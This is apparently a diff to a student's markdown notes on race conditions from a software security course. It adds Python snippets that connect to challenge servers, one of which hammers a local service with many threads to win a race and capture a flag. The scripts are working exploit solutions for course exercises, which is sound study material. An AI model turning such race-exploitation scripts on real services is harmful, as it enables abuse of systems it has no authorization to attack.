@@ -1,7 +1,7 @@
 # Race condition
 
 ### Create socket with python directly (practice-5)
-```
+```python
 import socket
 
 with socket.create_connection(('tasks.ws24.softsec.rub.de', 33269)) as so:
@@ -14,6 +14,36 @@ with socket.create_connection(('tasks.ws24.softsec.rub.de', 33269)) as so:
 
         so.sendall(b'/flag\n')
         so.recv(1024)
+```
+
+
+### Create multiple threads with socket (30 santa) 
+```python
+import pwn
+import socket
+import threading
+
+def get_presents():
+    while True:
+        try:
+            with socket.create_connection(('127.0.0.1', 1024)) as so:
+                response = b''
+                while b'What do you want to do?\n> ' not in response:
+                    response += so.recv(1024)
+                so.sendall(b'Get presents\n')
+                response = so.recv(1024)
+                if b'softsec' in response:
+                    print(response)
+        except:
+            continue
+
+for _ in range(15):
+    t = threading.Thread(target=get_presents)
+    t.start()
+
+t = threading.Thread(target=get_presents)
+t.start()
+t.join()
 ```
 
 
